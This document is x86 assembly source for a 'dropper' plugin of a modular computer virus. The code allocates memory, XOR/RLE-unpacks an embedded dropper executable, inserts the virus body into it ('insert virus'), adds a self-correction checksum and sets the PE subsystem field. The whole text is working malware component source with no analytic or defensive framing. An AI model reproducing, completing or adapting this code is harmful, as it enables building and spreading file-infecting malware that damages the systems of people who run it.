   ; DROPPER
   ; ~~~~~~~~
   ; - dropper manager: unpacks dropper,
   ;   then returns pointer to the PE file containing the virus (in memory)



   include                 INCLUDE\consts.inc
   include                 INCLUDE\pe.inc
   include                 system.inc
   include                 memory.inc
   include                 selfcorr.inc

   include                 plugin.inc
                           PLUGIN_START    DROPPER, CODE32, NON_PERMUTABLE

   handleevent:            hookevent EV_DROPPER_INIT, init
                           hookevent EV_DROPPER_DONE, done
                           stc
                           retn

   ; in: ESI

   done:                   pusha
                           mov     edx, esi
                           event   EV_MEMORY_MFREE
                           popa
                           clc
                           retn

   ; in:  EBX=dropper ID
   ; out: ESI/ECX

   init:                   pusha

                           mov     ecx, DROPPER_UNPACKED_SIZE
                           mov     [esp].popa_ecx, ecx
                           event   EV_MEMORY_MALLOC
                           mov     [esp].popa_esi, edx

                           call    get_dropper_code ; ESI<--packed data
                           mov     edi, edx         ; EDI<--output
                           cld
                           lodsd                    ; RLE-unpack
                           xchg    ebx, eax
   __cycle:                lodsb
                           movzx   ecx, al

   __repmovsb:             lodsb
                           xor     al, cl
                           stosb
                           loop    __repmovsb

                           lodsw
                           movzx   ecx, ax
                           xor     al, al
                           rep     stosb
                           dec     ebx
                           jnz     __cycle

                           lea     edi, [edx + DROPPER_INSERT_OFFS]
                           event   EV_SYSTEM_GET_VIR_SIZE  ; out: ESI/ECX
                           pusha
                           rep     movsb                   ; insert virus
                           popa

                           pusha
                           mov     esi, edi
                           add     edi, ecx
                           event   EV_SELFCORR_CSUM_CREATE
                           popa

                           mov     eax, [esp].pusha_ebx
                           mov     [edx + DROPPER_INSERT_ID], eax

   ;                        cmp     eax, EV_DROPPER_START_MAIN
   ;                        mov     ax, 2                     ; gui (main)
   ;                        je      __x1
   ;                        mov     ax, 3                     ; cui (arc)
   ;__x1:
                           mov     ax, 2                     ; gui (main)
                           mov     [edx + DROPPER_INSERT_XUI], ax

                           popa
                           clc
                           retn

   include                 dropper1.inc    ; compressed dropper (w/o virus)

                           PLUGIN_END
